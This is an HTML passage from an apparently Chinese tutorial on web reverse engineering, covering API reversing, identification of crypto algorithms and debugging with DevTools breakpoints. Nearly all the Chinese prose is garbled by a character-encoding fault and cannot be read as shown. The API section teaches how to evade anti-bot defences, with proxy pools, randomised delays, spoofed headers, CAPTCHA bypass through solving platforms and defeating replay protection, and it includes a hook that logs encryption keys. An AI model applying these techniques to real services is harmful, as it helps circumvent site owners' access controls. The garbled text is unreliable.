  <td>ç»‘å®šè®¾å¤‡ï¼ˆCanvasã€WebGLï¼‰</td>
  <td>â­â­â­â­ å›°éš¾ï¼ˆä¼ªé€ æŒ‡çº¹ï¼‰</td>
</tr>
<tr>
  <td><strong>éªŒè¯ç </strong></td>
  <td>äººæœºè¯†åˆ«ï¼ˆæ»‘å—ã€ç‚¹é€‰ï¼‰</td>
  <td>â­â­â­â­â­ æéš¾ï¼ˆOCR + æ‰“ç å¹³å°ï¼‰</td>
</tr>
</tbody>
</table>
<h3>9.2 é€†å‘å·¥ç¨‹å¸ˆå¯¹ç­–</h3>
<pre><code class="language-python"># 1. ä½¿ç”¨ IP ä»£ç†æ± 
import requests

proxies = {
    'http': 'http://proxy1.com:8080',
    'https': 'http://proxy1.com:8080'
}
response = requests.get(url, proxies=proxies)

# 2. éšæœºåŒ–è¯·æ±‚é—´éš”
import random
import time

for i in range(100):
    api_request()
    time.sleep(random.uniform(2, 5))  # 2-5ç§’éšæœºå»¶è¿Ÿ

# 3. æ¨¡æ‹ŸçœŸå®æµè§ˆå™¨è¡Œä¸º
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://www.example.com/',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}
</code></pre>
<hr />
<h2>10. å·¥å…·æ¨è</h2>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>å¹³å°</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Postman</strong></td>
  <td>API è°ƒè¯•ã€è¯·æ±‚é‡æ”¾</td>
  <td>å…¨å¹³å°</td>
</tr>
<tr>
  <td><strong>mitmproxy</strong></td>
  <td>æŠ“åŒ…ã€è¯·æ±‚ä¿®æ”¹ã€Python è„šæœ¬</td>
  <td>å…¨å¹³å°</td>
</tr>
<tr>
  <td><strong>Burp Suite</strong></td>
  <td>é«˜çº§æŠ“åŒ…ã€å‚æ•° Fuzzã€é‡æ”¾æ”»å‡»</td>
  <td>å…¨å¹³å°</td>
</tr>
<tr>
  <td><strong>Fiddler</strong></td>
  <td>Windows æŠ“åŒ…ç¥å™¨</td>
  <td>Windows</td>
</tr>
<tr>
  <td><strong>Charles</strong></td>
  <td>macOS æŠ“åŒ…å·¥å…·</td>
  <td>macOS</td>
</tr>
<tr>
  <td><strong>Insomnia</strong></td>
  <td>API è°ƒè¯•ï¼ˆPostman æ›¿ä»£å“ï¼‰</td>
  <td>å…¨å¹³å°</td>
</tr>
</tbody>
</table>
<hr />
<h2>æ€»ç»“</h2>
<p>API é€†å‘çš„æœ¬è´¨æ˜¯<strong>ç†è§£é€šä¿¡åè®®</strong>ã€‚æŒæ¡ä»¥ä¸‹æŠ€èƒ½ä½ å°†æ— å¾€ä¸åˆ©ï¼š</p>
<ol>
<li>âœ… <strong>ç­¾åç®—æ³•è¯†åˆ«</strong>ï¼šMD5/SHA/HMAC/è‡ªå®šä¹‰ç®—æ³•</li>
<li>âœ… <strong>åŠ å¯†å‚æ•°åˆ†æ</strong>ï¼šAES/RSA/è‡ªå®šä¹‰åŠ å¯†</li>
<li>âœ… <strong>é˜²é‡æ”¾æœºåˆ¶ç»•è¿‡</strong>ï¼šæ—¶é—´æˆ³/Nonce/åºåˆ—å·</li>
<li>âœ… <strong>è®¤è¯ç³»ç»Ÿ</strong>ï¼šJWT/Session/è‡ªå®šä¹‰ Token</li>
<li>âœ… <strong>RPC è°ƒç”¨</strong>ï¼šå¤„ç†å¤æ‚ JS/WASM é€»è¾‘</li>
<li>âœ… <strong>å¯¹æŠ—æ£€æµ‹</strong>ï¼šIP æ± ã€è¡Œä¸ºæ¨¡æ‹Ÿã€éªŒè¯ç å¤„ç†</li>
</ol>
<p><strong>è®°ä½</strong>: æœåŠ¡å™¨çœ‹ä¸å‡ºè¯·æ±‚æ¥è‡ªè„šæœ¬è¿˜æ˜¯æµè§ˆå™¨ï¼Œä½ å°±æˆåŠŸäº†ã€‚</p>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-29">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
<li><a href="#section-30">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
<li><a href="#section-20">Puppeteer ä¸ Playwright</a></li>
<li><a href="#section-33">éªŒè¯ç ç»•è¿‡</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-29">
                                                <h2>[R28] Crypto Identification</h2>
                                                <h1>R28: åŠ å¯†ç®—æ³•è¯†åˆ«ä¸åˆ†æ</h1>
<h2>æ¦‚è¿°</h2>
<p>Web åº”ç”¨ä¸­å¸¸ç”¨å„ç§åŠ å¯†ç®—æ³•æ¥ä¿æŠ¤æ•°æ®ä¼ è¾“å’Œå­˜å‚¨ã€‚è¯†åˆ«ä½¿ç”¨äº†å“ªç§ç®—æ³•æ˜¯é€†å‘çš„ç¬¬ä¸€æ­¥ã€‚æœ¬æ–‡ä»‹ç»å¸¸è§åŠ å¯†ç®—æ³•çš„ç‰¹å¾åŠè¯†åˆ«æ–¹æ³•ã€‚</p>
<hr />
<h2>å“ˆå¸Œç®—æ³• (Hash Functions)</h2>
<h3>MD5</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>è¾“å‡ºé•¿åº¦: 128 bit (16 bytes) = 32 ä½åå…­è¿›åˆ¶å­—ç¬¦</li>
<li>ä¸å¯é€†ï¼ˆå•å‘ï¼‰</li>
<li>å·²ä¸å®‰å…¨ï¼Œä½†ä»å¹¿æ³›ä½¿ç”¨</li>
</ul>
<p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// å…¸å‹è¾“å‡º
&quot;5d41402abc4b2a76b9719d911017c592&quot;; // MD5(&quot;hello&quot;)

// åº“ç‰¹å¾
CryptoJS.MD5(&quot;data&quot;).toString();
md5(&quot;data&quot;);
</code></pre>
<p><strong>Python å®ç°</strong>:</p>
<pre><code class="language-python">import hashlib
hashlib.md5(b&quot;hello&quot;).hexdigest()
# '5d41402abc4b2a76b9719d911017c592'
</code></pre>
<h3>SHA å®¶æ—</h3>
<table>
<thead>
<tr>
  <th>ç®—æ³•</th>
  <th>è¾“å‡ºé•¿åº¦</th>
  <th>åå…­è¿›åˆ¶é•¿åº¦</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td>SHA-1</td>
  <td>160 bit</td>
  <td>40 å­—ç¬¦</td>
  <td><code>aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d</code></td>
</tr>
<tr>
  <td>SHA-256</td>
  <td>256 bit</td>
  <td>64 å­—ç¬¦</td>
  <td><code>2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824</code></td>
</tr>
<tr>
  <td>SHA-512</td>
  <td>512 bit</td>
  <td>128 å­—ç¬¦</td>
  <td>(å¤ªé•¿çœç•¥)</td>
</tr>
</tbody>
</table>
<p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>
<ul>
<li>çœ‹è¾“å‡ºé•¿åº¦</li>
<li>æœç´¢å…³é”®è¯: <code>SHA</code>, <code>sha256</code>, <code>createHash</code></li>
</ul>
<p><strong>Node.js å®ç°</strong>:</p>
<pre><code class="language-javascript">const crypto = require(&quot;crypto&quot;);
crypto.createHash(&quot;sha256&quot;).update(&quot;hello&quot;).digest(&quot;hex&quot;);
</code></pre>
<hr />
<h2>å¯¹ç§°åŠ å¯† (Symmetric Encryption)</h2>
<h3>AES (Advanced Encryption Standard)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>å—åŠ å¯†ï¼Œå—å¤§å° 128 bit</li>
<li>å¯†é’¥é•¿åº¦: 128/192/256 bit</li>
<li>éœ€è¦ <strong>IV (Initialization Vector)</strong></li>
<li>æ¨¡å¼: ECB, CBC, CTR, GCM ç­‰</li>
</ul>
<p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// CryptoJS
CryptoJS.AES.encrypt(&quot;data&quot;, &quot;password&quot;).toString();

// Web Crypto API
crypto.subtle.encrypt({ name: &quot;AES-CBC&quot;, iv: iv }, key, data);

// æœç´¢å…³é”®è¯
&quot;AES&quot;, &quot;encrypt&quot;, &quot;decrypt&quot;, &quot;IV&quot;, &quot;padding&quot;;
</code></pre>
<p><strong>å¸¸è§æ¨¡å¼å¯¹æ¯”</strong>:</p>
<table>
<thead>
<tr>
  <th>æ¨¡å¼</th>
  <th>IV éœ€æ±‚</th>
  <th>å¹¶è¡ŒåŠ å¯†</th>
  <th>å®‰å…¨æ€§</th>
  <th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
  <td>ECB</td>
  <td>å¦</td>
  <td>æ˜¯</td>
  <td>ä½</td>
  <td>ä¸å®‰å…¨ï¼Œç›¸åŒæ˜æ–‡äº§ç”Ÿç›¸åŒå¯†æ–‡</td>
</tr>
<tr>
  <td>CBC</td>
  <td>æ˜¯</td>
  <td>å¦</td>
  <td>ä¸­</td>
  <td>æœ€å¸¸ç”¨</td>
</tr>
<tr>
  <td>CTR</td>
  <td>æ˜¯</td>
  <td>æ˜¯</td>
  <td>é«˜</td>
  <td>æµå¼åŠ å¯†</td>
</tr>
<tr>
  <td>GCM</td>
  <td>æ˜¯</td>
  <td>æ˜¯</td>
  <td>é«˜</td>
  <td>å¸¦è®¤è¯</td>
</tr>
</tbody>
</table>
<p><strong>Python å®ç° (AES-CBC)</strong>:</p>
<pre><code class="language-python">from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

key = b'1234567890123456'  # 16 bytes for AES-128
iv = b'abcdefghijklmnop'

# åŠ å¯†
cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(b'secret data', AES.block_size))
print(base64.b64encode(ciphertext).decode())

# è§£å¯†
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
print(plaintext.decode())
</code></pre>
<h3>DES / 3DES</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>DES: 56 bit å¯†é’¥ï¼Œå·²è¿‡æ—¶</li>
<li>3DES: 168 bit å¯†é’¥</li>
<li>å—å¤§å°: 64 bit</li>
</ul>
<p><strong>è¯†åˆ«</strong>: æœç´¢ <code>DES</code>, <code>TripleDES</code></p>
<hr />
<h2>éå¯¹ç§°åŠ å¯† (Asymmetric Encryption)</h2>
<h3>RSA</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†</li>
<li>å¯†é’¥é•¿åº¦: 1024/2048/4096 bit</li>
<li>æ…¢ï¼Œé€šå¸¸ç”¨äºåŠ å¯†å°æ•°æ®ï¼ˆå¦‚ AES å¯†é’¥ï¼‰</li>
</ul>
<p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// JSEncrypt åº“
var encrypt = new JSEncrypt();
encrypt.setPublicKey(publicKey);
var encrypted = encrypt.encrypt(&quot;data&quot;);

// Web Crypto API
crypto.subtle.encrypt({ name: &quot;RSA-OAEP&quot; }, publicKey, data);

// å…³é”®è¯
&quot;RSA&quot;, &quot;publicKey&quot;, &quot;privateKey&quot;, &quot;-----BEGIN PUBLIC KEY-----&quot;;
</code></pre>
<p><strong>å…¬é’¥æ ¼å¼</strong>:</p>
<pre><code>-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
</code></pre>
<p><strong>Python å®ç°</strong>:</p>
<pre><code class="language-python">from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

# ç”Ÿæˆå¯†é’¥å¯¹
key = RSA.generate(2048)
public_key = key.publickey()

# åŠ å¯†
cipher = PKCS1_OAEP.new(public_key)
ciphertext = cipher.encrypt(b'secret')
print(base64.b64encode(ciphertext).decode())

# è§£å¯†
cipher = PKCS1_OAEP.new(key)
plaintext = cipher.decrypt(ciphertext)
print(plaintext.decode())
</code></pre>
<hr />
<h2>ç¼–ç  vs åŠ å¯†</h2>
<h3>Base64 (ç¼–ç ï¼ŒéåŠ å¯†)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>å­—ç¬¦é›†: <code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>/</code></li>
<li>ç»“å°¾å¯èƒ½æœ‰ <code>=</code> æˆ– <code>==</code> å¡«å……</li>
<li>é•¿åº¦æ˜¯ 4 çš„å€æ•°</li>
</ul>
<p><strong>è¯†åˆ«</strong>:</p>
<pre><code class="language-javascript">btoa(&quot;hello&quot;); // &quot;aGVsbG8=&quot;
atob(&quot;aGVsbG8=&quot;); // &quot;hello&quot;
</code></pre>
<p><strong>Python</strong>:</p>
<pre><code class="language-python">import base64
base64.b64encode(b'hello').decode()  # 'aGVsbG8='
base64.b64decode('aGVsbG8=').decode()  # 'hello'
</code></pre>
<h3>Hex (åå…­è¿›åˆ¶ç¼–ç )</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>å­—ç¬¦é›†: <code>0-9</code>, <code>a-f</code></li>
<li>æ¯ä¸ªå­—èŠ‚ç”¨ 2 ä¸ªå­—ç¬¦è¡¨ç¤º</li>
</ul>
<p><strong>è¯†åˆ«</strong>:</p>
<pre><code class="language-javascript">&quot;48656c6c6f&quot;; // &quot;Hello&quot; çš„ Hex ç¼–ç 
</code></pre>
<p><strong>Python</strong>:</p>
<pre><code class="language-python">'Hello'.encode().hex()  # '48656c6c6f'
bytes.fromhex('48656c6c6f').decode()  # 'Hello'
</code></pre>
<hr />
<h2>è¯†åˆ«æµç¨‹</h2>
<h3>æ­¥éª¤ä¸€ï¼šè§‚å¯Ÿè¾“å‡ºç‰¹å¾</h3>
<ol>
<li><p><strong>é•¿åº¦å›ºå®š</strong>: å¯èƒ½æ˜¯å“ˆå¸Œ</p>
<ul>
<li>32 å­—ç¬¦ -&gt; MD5</li>
<li>40 å­—ç¬¦ -&gt; SHA-1</li>
<li>64 å­—ç¬¦ -&gt; SHA-256</li>
</ul>
</li>
<li><p><strong>é•¿åº¦å¯å˜</strong>: å¯èƒ½æ˜¯åŠ å¯†æˆ–ç¼–ç </p>
<ul>
<li>ç»“å°¾æœ‰ <code>=</code> -&gt; Base64</li>
<li>å…¨æ˜¯ <code>0-9a-f</code> -&gt; Hex</li>
</ul>
</li>
</ol>
<h3>æ­¥éª¤äºŒï¼šæœç´¢å…³é”®è¯</h3>
<p>åœ¨ Sources é¢æ¿å…¨å±€æœç´¢ï¼š</p>
<ul>
<li>é€šç”¨: <code>encrypt</code>, <code>decrypt</code>, <code>crypto</code></li>
<li>åº“å: <code>CryptoJS</code>, <code>JSEncrypt</code>, <code>forge</code></li>
<li>ç®—æ³•å: <code>AES</code>, <code>RSA</code>, <code>MD5</code>, <code>SHA</code></li>
</ul>
<h3>æ­¥éª¤ä¸‰ï¼šHook åŠ å¯†å‡½æ•°</h3>
<pre><code class="language-javascript">// Hook CryptoJS
if (window.CryptoJS) {
  const originalAES = CryptoJS.AES.encrypt;
  CryptoJS.AES.encrypt = function (message, key, cfg) {
    console.log(&quot;[AES Encrypt]&quot;);
    console.log(&quot;Message:&quot;, message.toString());
    console.log(&quot;Key:&quot;, key.toString());
    debugger;
    return originalAES.apply(this, arguments);
  };
}
</code></pre>
<hr />
<h2>å¸¸è§åŠ å¯†åº“</h2>
<h3>JavaScript åŠ å¯†åº“</h3>
<table>
<thead>
<tr>
  <th>åº“å</th>
  <th>ç‰¹ç‚¹</th>
  <th>æ£€æµ‹æ–¹æ³•</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>CryptoJS</strong></td>
  <td>æœ€æµè¡Œçš„çº¯ JS åŠ å¯†åº“</td>
  <td><code>window.CryptoJS</code></td>
</tr>
<tr>
  <td><strong>Forge</strong></td>
  <td>å…¨åŠŸèƒ½åŠ å¯†åº“</td>
  <td><code>window.forge</code></td>
</tr>
<tr>
  <td><strong>JSEncrypt</strong></td>
  <td>RSA ä¸“ç”¨</td>
  <td><code>window.JSEncrypt</code></td>
</tr>
<tr>
  <td><strong>crypto-js</strong></td>
  <td>CryptoJS çš„ npm åŒ…</td>
  <td><code>require('crypto-js')</code></td>
</tr>
<tr>
  <td><strong>Web Crypto API</strong></td>
  <td>æµè§ˆå™¨åŸç”Ÿ</td>
  <td><code>window.crypto.subtle</code></td>
</tr>
</tbody>
</table>
<h3>Python åŠ å¯†åº“</h3>
<table>
<thead>
<tr>
  <th>åº“å</th>
  <th>å®‰è£…</th>
  <th>ç”¨é€”</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>hashlib</strong></td>
  <td>å†…ç½®</td>
  <td>MD5, SHA</td>
</tr>
<tr>
  <td><strong>pycryptodome</strong></td>
  <td><code>pip install pycryptodome</code></td>
  <td>AES, RSA, DES</td>
</tr>
<tr>
  <td><strong>cryptography</strong></td>
  <td><code>pip install cryptography</code></td>
  <td>ç°ä»£åŠ å¯†åº“</td>
</tr>
</tbody>
</table>
<hr />
<h2>å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1: è¯†åˆ«æœªçŸ¥å“ˆå¸Œ</h3>
<p><strong>è§‚å¯Ÿ</strong>:</p>
<pre><code>è¾“å…¥: &quot;admin&quot;
è¾“å‡º: &quot;21232f297a57a5a743894a0e4a801fc3&quot;
</code></pre>
<p><strong>åˆ†æ</strong>:</p>
<ul>
<li>é•¿åº¦ 32 -&gt; MD5</li>
<li>éªŒè¯: <code>MD5(&quot;admin&quot;)</code> = <code>21232f297a57a5a743894a0e4a801fc3</code> âœ…</li>
</ul>
<h3>æ¡ˆä¾‹ 2: è¯†åˆ«åŠ å¯†ç®—æ³•</h3>
<p><strong>è§‚å¯Ÿ</strong>:</p>
<pre><code class="language-javascript">var encrypted = &quot;U2FsdGVkX1+gGv7...&quot;; // Base64 æ ¼å¼
</code></pre>
<p><strong>åˆ†æ</strong>:</p>
<ul>
<li>å¼€å¤´ <code>U2FsdGVkX1</code> -&gt; Base64 è§£ç  = <code>Salted__</code></li>
<li>è¿™æ˜¯ <strong>CryptoJS AES</strong> çš„å…¸å‹ç‰¹å¾</li>
</ul>
<p><strong>éªŒè¯</strong>:</p>
<pre><code class="language-javascript">CryptoJS.AES.encrypt(&quot;data&quot;, &quot;password&quot;).toString();
// &quot;U2FsdGVkX1+...&quot;
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-27">JavaScript Hook æŠ€æœ¯</a></li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
<li><a href="#section-28">API æ¥å£é€†å‘</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-30">
                                                <h2>[R29] Dynamic Parameter Analysis</h2>
                                                <h1>R29: åŠ¨æ€å‚æ•°åˆ†æ</h1>
<h2>æ¦‚è¿°</h2>
<p>å½“é™æ€ä»£ç æ··æ·†å¾—åƒä¸€å›¢ä¹±éº»æ—¶ï¼ŒåŠ¨æ€åˆ†ææ˜¯æˆ‘ä»¬å”¯ä¸€çš„å‡ºè·¯ã€‚é€šè¿‡è§‚å¯Ÿå‚æ•°åœ¨è¿è¡Œæ—¶çš„å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æ¨å¯¼å‡ºç”Ÿæˆé€»è¾‘ã€‚</p>
<p>åŠ¨æ€åˆ†æçš„æ ¸å¿ƒæ˜¯<strong>è§‚å¯Ÿæ•°æ®æµ</strong> â€”â€” ä¸è¦è¯•å›¾ç†è§£æ¯ä¸€è¡Œæ··æ·†ä»£ç çš„è¯­ä¹‰ï¼Œè€Œæ˜¯å…³æ³¨æ•°æ®ä»å“ªé‡Œæ¥ã€ç»è¿‡äº†ä»€ä¹ˆå¤„ç†ã€æœ€åå˜æˆäº†ä»€ä¹ˆã€‚</p>
<hr />
<h2>1. å †æ ˆè·Ÿè¸ª (Stack Trace) åˆ†æ</h2>
<p>è°ƒç”¨æ ˆæ˜¯ç¨‹åºæ‰§è¡Œçš„&quot;æ¡ˆå‘ç°åœº&quot;ï¼Œæ˜¯å®šä½ä»£ç çš„ç¬¬ä¸€æ‰‹æ®µã€‚</p>
<h3>1.1 æŸ¥çœ‹è°ƒç”¨æ ˆçš„æ–¹æ³•</h3>
<h4>æ–¹æ³• 1ï¼šæ–­ç‚¹è‡ªåŠ¨åœä¸‹</h4>
<p>åœ¨ Sources é¢æ¿æ‰“æ–­ç‚¹åï¼Œå³ä¾§ Call Stack é¢æ¿ä¼šæ˜¾ç¤ºå®Œæ•´è°ƒç”¨é“¾ï¼š</p>
<pre><code>generateSign (utils.js:1234)
  â†‘ è°ƒç”¨è€…
sendRequest (api.js:567)
  â†‘ è°ƒç”¨è€…
onClick (main.js:89)
  â†‘ è°ƒç”¨è€…
(anonymous) (VM123:5)  â† äº‹ä»¶ç›‘å¬å™¨
</code></pre>
<h4>æ–¹æ³• 2ï¼šæ‰‹åŠ¨æ‰“å°å †æ ˆ</h4>
<p>åœ¨ Console ä¸­ä»»ä½•ä½ç½®æ‰§è¡Œï¼š</p>
<pre><code class="language-javascript">console.trace(&quot;å½“å‰è°ƒç”¨æ ˆ&quot;);
</code></pre>
<p>è¾“å‡ºç±»ä¼¼ï¼š</p>
<pre><code>console.trace
  at generateSign (utils.js:1234)
  at sendRequest (api.js:567)
  at onClick (main.js:89)
</code></pre>
<h4>æ–¹æ³• 3ï¼šä½¿ç”¨ Error å¯¹è±¡</h4>
<pre><code class="language-javascript">const stack = new Error().stack;
console.log(stack);
</code></pre>
<h3>1.2 å¯»æ‰¾&quot;æ–­å±‚&quot;æŠ€å·§</h3>
<p><strong>ç°è±¡</strong>: è°ƒç”¨æ ˆä¸­çªç„¶å‡ºç°ä»¥ä¸‹ç‰¹å¾</p>
<ul>
<li><code>VM123</code>, <code>eval</code> â†’ åŠ¨æ€ç”Ÿæˆçš„ä»£ç </li>
<li><code>l</code>, <code>e</code>, <code>f</code>, <code>t</code> ç­‰å•å­—æ¯å‡½æ•°å â†’ æ··æ·†åçš„ä»£ç </li>
<li><code>&lt;anonymous&gt;</code> â†’ åŒ¿åå‡½æ•°ï¼ˆå¯èƒ½æ˜¯ç«‹å³æ‰§è¡Œå‡½æ•° IIFEï¼‰</li>
</ul>
<p><strong>å«ä¹‰</strong>: è¿™é€šå¸¸æ„å‘³ç€è¿›å…¥äº†æ··æ·†åçš„æ ¸å¿ƒé€»è¾‘</p>
<p><strong>æ“ä½œ</strong>: åœ¨æ ˆé¡¶çš„ç¬¬ä¸€ä¸ª<strong>å¯è¯»å‡½æ•°</strong>å¤„æ‰“æ–­ç‚¹ï¼Œç„¶å Step Into (F11) è¿›å…¥å†…éƒ¨</p>
<p><strong>ç¤ºä¾‹</strong></p>
<pre><code>Call Stack:
generateSign (utils.js:1234)  â† å¯è¯»ï¼Œä»è¿™é‡Œå¼€å§‹è°ƒè¯•
  â†‘
t (VM123:5)                   â† æ··æ·†ä»£ç 
  â†‘
e (VM123:2)                   â† æ··æ·†ä»£ç 
  â†‘
onClick (main.js:89)          â† å¯è¯»
</code></pre>
<h3>1.3 åˆ©ç”¨ Initiator (å‘èµ·è€…)</h3>
<p>Chrome çš„ Network é¢æ¿æœ‰ä¸€åˆ— <code>Initiator</code>ï¼Œæ˜¾ç¤ºè¯·æ±‚çš„æ¥æºã€‚</p>
<p><strong>æ“ä½œæ­¥éª¤</strong>:</p>
<ol>
<li>Network é¢æ¿æ‰¾åˆ°ç›®æ ‡è¯·æ±‚</li>
<li>æŸ¥çœ‹ Initiator åˆ—</li>
<li>ç‚¹å‡»è“è‰²é“¾æ¥ â†’ ç›´æ¥è·³è½¬åˆ°å‘åŒ…ä»£ç </li>
</ol>
<p><strong>Initiator ç±»å‹</strong>:</p>
<table>
<thead>
<tr>
  <th>ç±»å‹</th>
  <th>å«ä¹‰</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Script</strong></td>
  <td>JS ä»£ç å‘èµ·</td>
  <td><code>api.js:567</code></td>
</tr>
<tr>
  <td><strong>Parser</strong></td>
  <td>HTML è§£æå™¨åŠ è½½</td>
  <td><code>&lt;img src=&quot;...&quot;&gt;</code></td>
</tr>
<tr>
  <td><strong>Redirect</strong></td>
  <td>é‡å®šå‘</td>
  <td><code>301/302</code></td>
</tr>
<tr>
  <td><strong>Other</strong></td>
  <td>å…¶ä»–ï¼ˆæ‰©å±•ã€DevToolsï¼‰</td>
  <td>-</td>
</tr>
</tbody>
</table>
<p><strong>é«˜çº§åŠŸèƒ½</strong>: Request Call Stack</p>
<ul>
<li>å¼€å¯: DevTools Settings â†’ Experiments â†’ Enable async stack traces</li>
<li>æ•ˆæœ: å¯ä»¥çœ‹åˆ°å¼‚æ­¥å›è°ƒå‰çš„è°ƒç”¨æ ˆï¼ˆå¦‚ <code>setTimeout</code>, <code>Promise.then</code>ï¼‰</li>
</ul>
<hr />
<h2>2. æ–­ç‚¹æŠ€æœ¯</h2>
<h3>2.1 æ–­ç‚¹ç±»å‹</h3>
<h4>æ™®é€šæ–­ç‚¹ (Line Breakpoint)</h4>
<p>ç‚¹å‡»è¡Œå·å³å¯ï¼Œä»£ç æ‰§è¡Œåˆ°æ­¤è¡Œæ—¶æš‚åœã€‚</p>
<h4>æ¡ä»¶æ–­ç‚¹ (Conditional Breakpoint)</h4>
<p>å³é”®è¡Œå· â†’ &quot;Add conditional breakpoint&quot;</p>
<p><strong>åº”ç”¨åœºæ™¯</strong>: åªåœ¨ç‰¹å®šæ¡ä»¶ä¸‹æš‚åœ</p>
<pre><code class="language-javascript">// åªåœ¨ userId ç­‰äº 123 æ—¶æš‚åœ
userId === 123;

// åªåœ¨ç¬¬ 10 æ¬¡å¾ªç¯æ—¶æš‚åœ
i === 10;

// åªåœ¨å‚æ•°åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²æ—¶æš‚åœ
params.includes(&quot;target&quot;);
</code></pre>
<h4>æ—¥å¿—æ–­ç‚¹ (Logpoint)</h4>
<p>å³é”®è¡Œå· â†’ &quot;Add logpoint&quot;</p>
<p><strong>åº”ç”¨åœºæ™¯</strong>: ä¸æš‚åœï¼Œåªæ‰“å°æ—¥å¿—ï¼ˆç›¸å½“äº <code>console.log</code> ä½†ä¸ä¿®æ”¹æºç ï¼‰</p>
<pre><code class="language-javascript">// è¯­æ³•ï¼ˆä¸éœ€è¦å†™ console.logï¼‰
&quot;userId:&quot;, userId, &quot;timestamp:&quot;, timestamp;
</code></pre>
<h4>DOM æ–­ç‚¹ (DOM Breakpoint)</h4>
<p>åœ¨ Elements é¢æ¿å³é”®å…ƒç´  â†’ &quot;Break on&quot;:</p>
<ul>
<li><strong>subtree modifications</strong>: å­å…ƒç´ è¢«ä¿®æ”¹</li>
<li><strong>attribute modifications</strong>: å±æ€§è¢«ä¿®æ”¹ï¼ˆå¦‚ <code>class</code>, <code>style</code>ï¼‰</li>
<li><strong>node removal</strong>: å…ƒç´ è¢«åˆ é™¤</li>
</ul>
<p><strong>åº”ç”¨åœºæ™¯</strong>: è¿½è¸ªæ˜¯è°ä¿®æ”¹äº†æŸä¸ª DOM å…ƒç´ </p>
<h4>XHR/Fetch æ–­ç‚¹</h4>
<p>Sources é¢æ¿ â†’ XHR/fetch Breakpoints â†’ æ·»åŠ  URL å…³é”®å­—</p>
<p><strong>åº”ç”¨åœºæ™¯</strong>: åœ¨å‘é€åŒ…å« <code>/api/login</code> çš„è¯·æ±‚å‰è‡ªåŠ¨æ–­ç‚¹</p>
<pre><code>å…³é”®å­—: /api/login
</code></pre>
<h4>äº‹ä»¶ç›‘å¬å™¨æ–­ç‚¹ (Event Listener Breakpoint)</h4>
<p>Sources é¢æ¿ â†’ Event Listener Breakpoints â†’ å‹¾é€‰äº‹ä»¶ç±»å‹</p>
<p><strong>å¸¸ç”¨äº‹ä»¶</strong>:</p>
<ul>
<li>Mouse â†’ <code>click</code>, <code>mousedown</code></li>
<li>Keyboard â†’ <code>keydown</code>, <code>keypress</code></li>
<li>Timer â†’ <code>setTimeout</code>, <code>setInterval</code></li>
</ul>
<h3>2.2 æ–­ç‚¹è°ƒè¯•æŠ€å·§</h3>
<h4>å•æ­¥è°ƒè¯•å¿«æ·é”®</h4>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>F8</strong></td>
  <td>Resume</td>
  <td>ç»§ç»­æ‰§è¡Œï¼ˆåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼‰</td>
</tr>
<tr>
  <td><strong>F10</strong></td>
  <td>Step Over</td>
  <td>å•æ­¥è·³è¿‡ï¼ˆä¸è¿›å…¥å‡½æ•°å†…éƒ¨ï¼‰</td>
</tr>
<tr>
  <td><strong>F11</strong></td>
  <td>Step Into</td>
  <td>å•æ­¥è¿›å…¥ï¼ˆè¿›å…¥å‡½æ•°å†…éƒ¨ï¼‰</td>
</tr>
<tr>
  <td><strong>Shift+F11</strong></td>
  <td>Step Out</td>
